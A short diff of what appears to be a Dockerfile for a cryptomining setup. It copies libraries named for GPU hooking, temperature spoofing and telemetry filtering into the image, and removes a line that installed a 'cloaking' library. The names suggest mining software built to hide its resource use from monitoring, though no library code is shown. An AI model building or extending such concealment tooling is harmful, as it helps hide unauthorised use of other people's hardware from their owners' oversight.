@@ -119,7 +119,6 @@ COPY entrypoint.sh /app/entrypoint.sh
 COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
 COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
 COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
-COPY mining_environment/cpu_plugins/cloaking_lib/libcloak.so /usr/local/lib/libcloak.so
 
 # GPU telemetry filter moved to gpu_plugins module
 COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/
